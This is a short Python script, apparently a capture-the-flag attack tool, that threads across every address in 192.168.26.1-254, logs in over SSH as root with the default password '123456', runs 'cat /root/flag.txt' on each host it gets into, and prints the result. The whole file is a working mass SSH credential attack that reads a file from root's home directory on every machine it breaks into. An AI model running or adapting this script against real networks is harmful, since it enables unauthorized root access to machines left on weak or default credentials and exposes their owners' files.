import paramiko,threading,sys

def ss(h):
	ssh=paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(h,22,'root','123456')
		a,b,c=ssh.exec_command('cat /root/flag.txt')
		print(h+' '+b.read())
	except Exception as e:
		sys.exit()

if __name__ == '__main__':
	a=1
	while a<=254:
		h='192.168.26.'+str(a)
		t=threading.Thread(target=ss,args=(h,))
		t.start()
		a=a+1